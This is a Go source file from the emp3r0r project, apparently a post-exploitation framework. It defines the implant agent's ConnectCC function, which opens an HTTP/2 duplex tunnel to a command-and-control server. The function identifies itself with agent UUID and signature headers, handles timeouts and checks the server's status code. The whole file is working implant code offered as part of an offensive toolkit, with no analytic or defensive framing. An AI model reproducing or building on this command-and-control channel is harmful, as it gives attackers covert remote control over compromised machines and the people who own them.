package c2transport

import (
	"context"
	"fmt"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"net/http"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/posener/h2conn"
)

// ConnectCC connect to CC with h2conn
func ConnectCC(url string) (conn *h2conn.Conn, ctx context.Context, cancel context.CancelFunc, err error) {
	// use h2conn for duplex tunnel
	ctx, cancel = context.WithCancel(context.Background())

	h2 := h2conn.Client{
		Client: def.HTTPClient,
		Header: http.Header{
			"AgentUUID":    {common.RuntimeConfig.AgentUUID},
			"AgentUUIDSig": {common.RuntimeConfig.AgentUUIDSig},
		},
	}
	logging.Printf("ConnectCC: connecting to %s", url)

	type connectResult struct {
		conn *h2conn.Conn
		resp *http.Response
		err  error
	}
	resultChan := make(chan connectResult, 1)

	go func() {
		c, r, e := h2.Connect(ctx, url)
		resultChan <- connectResult{conn: c, resp: r, err: e}
	}()

	select {
	case res := <-resultChan:
		conn = res.conn
		resp := res.resp
		err = res.err

		if err != nil {
			err = fmt.Errorf("connectCC: initiate h2 conn: %s", err)
			logging.Print(err)
			cancel()
			return
		}
		// Check server status code
		if resp != nil {
			if resp.StatusCode != http.StatusOK {
				err = fmt.Errorf("bad status code: %d", resp.StatusCode)
				conn = nil
				cancel()
				return
			}
		}
	case <-time.After(10 * time.Second):
		err = fmt.Errorf("connectCC at %s failed: timeout", url)
		cancel()
		return
	}

	return
}
